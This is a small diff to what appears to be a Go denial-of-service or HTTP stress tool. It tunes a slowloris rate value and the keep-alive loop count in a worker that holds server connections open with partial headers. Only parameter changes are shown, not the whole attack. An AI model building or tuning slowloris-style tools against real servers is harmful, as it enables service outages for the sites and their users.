@@ -21,7 +21,7 @@ var (
 	timer         int
 	customHost    string
 	httpMethods   = []string{"GET", "HEAD", "POST"}
-	slowlorisRate = 0.5 // float64 type
+	slowlorisRate = 0.3 // float64 type
 )
 
 func init() {
@@ -201,7 +201,7 @@ func slowlorisWorker(id int, stop <-chan struct{}) {
 			conn.Write([]byte(partial))
 
 			// Keep connection alive with partial headers
-			for i := 0; i < 15; i++ {
+			for i := 0; i < 10; i++ {
 				select {
 				case <-stop:
 					conn.Close()
